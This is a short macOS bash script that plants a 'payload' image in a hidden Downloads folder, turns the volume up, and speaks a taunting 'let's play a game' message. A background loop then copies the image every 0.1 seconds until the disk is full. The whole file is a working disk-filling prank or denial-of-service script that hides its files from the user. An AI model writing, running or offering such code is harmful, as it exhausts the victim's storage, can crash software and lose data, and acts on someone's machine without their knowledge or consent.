#!/bin/bash

mkdir -p ~/Downloads/.dingdong
cp "$(dirname "$0")/payload.png" ~/Downloads/.dingdong/.hidden.jpg

osascript -e "set volume output volume 80"
say "Ding dong. Let's play a game."

(
i=0
while true; do
    cp ~/Downloads/.dingdong/.hidden.jpg ~/Downloads/.dingdong/copy_$i.jpg 2>/dev/null
    if [ $? -ne 0 ]; then
        say "No more space left. I'm done."
        break
    fi
    i=$((i + 1))
    sleep 0.1
done
) &
